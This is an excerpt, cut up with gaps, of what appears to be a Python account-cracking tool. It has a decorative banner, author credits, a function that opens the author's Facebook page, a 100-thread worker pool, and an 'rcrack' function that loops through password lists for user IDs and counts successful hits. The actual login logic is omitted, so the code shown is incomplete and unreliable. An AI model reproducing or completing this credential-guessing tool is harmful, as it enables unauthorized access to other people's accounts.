...
╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: MUEID MURSALIN RIFAT
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94m rifat1haker
...
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/mueid.mursalinrifat.haker')
    print(logo)
    ...
    with ThreadPool(max_workers=100) as turag:
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY Rifat JOIN MY GROUP ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sRifat\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
